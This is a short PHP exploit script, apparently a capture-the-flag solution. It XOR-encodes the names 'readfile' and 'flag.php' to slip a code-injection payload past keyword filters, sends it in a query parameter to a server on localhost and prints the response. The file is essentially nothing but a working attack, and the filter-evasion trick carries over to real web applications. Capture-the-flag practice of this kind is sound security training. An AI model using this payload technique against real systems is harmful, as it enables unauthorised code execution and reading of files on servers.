<?php

function xor_encode($cmd) {
    $a = str_repeat(chr(0xaa), strlen($cmd));
    $encoded_cmd = $a ^ $cmd;

    return $a . '^' . $encoded_cmd;
}

$pld = '$b=' . xor_encode("readfile") . ';';
$pld .= '$b(' . xor_encode('flag.php') . ');';

$exploit_site = 'http://localhost:8019';
print file_get_contents($exploit_site . '/?k=' . urlencode($pld));
